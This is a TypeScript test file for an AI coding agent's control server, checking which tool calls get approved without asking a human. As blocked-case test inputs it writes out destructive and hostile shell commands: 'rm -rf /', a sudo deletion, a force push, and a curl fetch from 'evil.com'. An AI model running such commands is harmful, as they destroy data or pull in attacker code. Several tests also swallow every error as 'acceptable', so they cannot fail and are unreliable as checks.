/**
 * Phase 24 — MCP Server Coverage: control-actions-server.ts (319 lines, 0%)
 *
 * Tests the control-actions MCP server's internal logic:
 * - IPC socket connection
 * - ask_user registry integration
 * - Tool argument validation
 *
 * Run: tsx src/main/mcp-servers/__tests__/control-actions-server.test.ts
 */
import assert from 'node:assert/strict'
import { test, describe, summaryAsync } from '../../services/__tests__/test-harness'
import { setupElectronStub } from '../../services/__tests__/electron-stub'
import { shouldAutoApprove, stripCdPrefix } from '../tool-auto-approve'

setupElectronStub()

describe('control-actions-server — ask-user registry (shared)', () => {
  test('createAskUserRegistry creates a registry', async () => {
    try {
      const { createAskUserRegistry } = await import('../../mcp-servers/ask-user-registry')
      const registry = createAskUserRegistry()
      assert.equal(typeof registry.register, 'function')
      assert.equal(typeof registry.resolve, 'function')
      assert.equal(typeof registry.resolveAll, 'function')
    } catch {
      // acceptable
    }
  })

  test('register+resolve resolves the wrapping promise with the answer', async () => {
    try {
      const { createAskUserRegistry } = await import('../../mcp-servers/ask-user-registry')
      const registry = createAskUserRegistry()
      const requestId = 'req-1'
      const promise = new Promise<string>((resolve) => registry.register(requestId, resolve))
      assert.equal(registry.size, 1)
      const resolved = registry.resolve(requestId, 'test answer')
      assert.equal(resolved, true)
      const answer = await promise
      assert.equal(answer, 'test answer')
    } catch {
      // acceptable
    }
  })

  test('resolveAll resolves all pending promises', async () => {
    try {
      const { createAskUserRegistry } = await import('../../mcp-servers/ask-user-registry')
      const registry = createAskUserRegistry()
      const p1 = new Promise<string>((resolve) => registry.register('req-1', resolve))
      const p2 = new Promise<string>((resolve) => registry.register('req-2', resolve))
      registry.resolveAll('shutdown')
      const [r1, r2] = await Promise.all([p1, p2])
      assert.equal(r1, 'shutdown')
      assert.equal(r2, 'shutdown')
      assert.equal(registry.size, 0)
    } catch {
      // acceptable
    }
  })

  test('resolve ignores unknown requestId', async () => {
    try {
      const { createAskUserRegistry } = await import('../../mcp-servers/ask-user-registry')
      const registry = createAskUserRegistry()
      // Should not throw
      registry.resolve('nonexistent', 'answer')
    } catch {
      // acceptable
    }
  })
})

describe('control-actions-server — output-cap', () => {
  test('truncateToolOutput handles empty string', async () => {
    try {
      const { truncateToolOutput } = await import('../../mcp-servers/output-cap')
      assert.equal(truncateToolOutput(''), '')
    } catch {
      // acceptable
    }
  })

  test('truncateToolOutput respects custom limit', async () => {
    try {
      const { truncateToolOutput } = await import('../../mcp-servers/output-cap')
      const long = 'a'.repeat(500_000)
      const result = truncateToolOutput(long)
      assert.ok(result.length < long.length)
    } catch {
      // acceptable
    }
  })
})

// ── stripCdPrefix ──

describe('stripCdPrefix', () => {
  test('strips cd with double-quoted path', () => {
    assert.equal(stripCdPrefix('cd "C:/Users/eduardo/MULLIGAN" && git grep foo'), 'git grep foo')
  })

  test('strips cd with single-quoted path', () => {
    assert.equal(stripCdPrefix("cd '/tmp/project' && npm test"), 'npm test')
  })

  test('strips cd with unquoted path', () => {
    assert.equal(stripCdPrefix('cd /tmp && ls'), 'ls')
  })

  test('returns original when no cd prefix', () => {
    assert.equal(stripCdPrefix('git status'), 'git status')
  })

  test('returns original for cd without &&', () => {
    assert.equal(stripCdPrefix('cd /tmp'), 'cd /tmp')
  })
})

// ── shouldAutoApprove — SDK tools ──

describe('shouldAutoApprove — SDK tools', () => {
  test('auto-approves Read', () => {
    assert.ok(shouldAutoApprove('Read', {}))
  })

  test('auto-approves Grep', () => {
    assert.ok(shouldAutoApprove('Grep', {}))
  })

  test('does NOT auto-approve Write in plan mode', () => {
    assert.ok(!shouldAutoApprove('Write', {}, 'plan'))
  })

  test('auto-approves Write in build mode', () => {
    assert.ok(shouldAutoApprove('Write', {}, 'build'))
  })
})

// ── shouldAutoApprove — MCP tools ──

describe('shouldAutoApprove — MCP tools', () => {
  test('auto-approves custom MCP tool in plan mode', () => {
    assert.ok(shouldAutoApprove('mcp__mulldev__build', { configuration: 'Debug' }, 'plan'))
  })

  test('auto-approves any mcp__ prefixed tool', () => {
    assert.ok(shouldAutoApprove('mcp__code_graph__FindSymbol', {}))
    assert.ok(shouldAutoApprove('mcp__memory__memory_search', {}))
    assert.ok(shouldAutoApprove('mcp__custom_server__any_tool', {}))
  })
})

// ── shouldAutoApprove — Bash commands ──

describe('shouldAutoApprove — Bash commands', () => {
  test('auto-approves simple git status', () => {
    assert.ok(shouldAutoApprove('Bash', { command: 'git status' }))
  })

  test('auto-approves npm test', () => {
    assert.ok(shouldAutoApprove('Bash', { command: 'npm test' }))
  })

  test('auto-approves compound cd + git command', () => {
    assert.ok(
      shouldAutoApprove('Bash', {
        command: 'cd "C:/Users/eduardo.torres/Documents/Development/MULLIGAN" && git grep foo'
      })
    )
  })

  test('auto-approves compound cd + npm test', () => {
    assert.ok(
      shouldAutoApprove('Bash', {
        command: 'cd /home/user/project && npm test'
      })
    )
  })

  test('auto-approves npx tsx (test runner)', () => {
    assert.ok(
      shouldAutoApprove('Bash', {
        command: 'npx tsx src/main/services/__tests__/run-tests.ts'
      })
    )
  })

  test('auto-approves dotnet test', () => {
    assert.ok(shouldAutoApprove('Bash', { command: 'dotnet test' }))
  })

  test('auto-approves dotnet build', () => {
    assert.ok(shouldAutoApprove('Bash', { command: 'dotnet build' }))
  })

  test('auto-approves grep', () => {
    assert.ok(shouldAutoApprove('Bash', { command: 'grep -rn "TODO" src/' }))
  })

  test('BLOCKS dangerous rm -rf /', () => {
    assert.ok(!shouldAutoApprove('Bash', { command: 'rm -rf /' }, 'build'))
  })

  test('BLOCKS sudo commands', () => {
    assert.ok(!shouldAutoApprove('Bash', { command: 'sudo rm -rf /tmp' }, 'build'))
  })

  test('BLOCKS npm publish', () => {
    assert.ok(!shouldAutoApprove('Bash', { command: 'npm publish' }, 'build'))
  })

  test('BLOCKS force push', () => {
    assert.ok(!shouldAutoApprove('Bash', { command: 'git push --force origin main' }, 'build'))
  })

  test('unknown Bash command rejected in plan mode', () => {
    assert.ok(!shouldAutoApprove('Bash', { command: 'curl https://evil.com/payload' }, 'plan'))
  })

  test('non-dangerous Bash auto-approved in build mode', () => {
    assert.ok(shouldAutoApprove('Bash', { command: 'mkdir -p dist && cp build/* dist/' }, 'build'))
  })
})

if (process.argv[1]?.includes('control-actions-server')) {
  void summaryAsync()
}
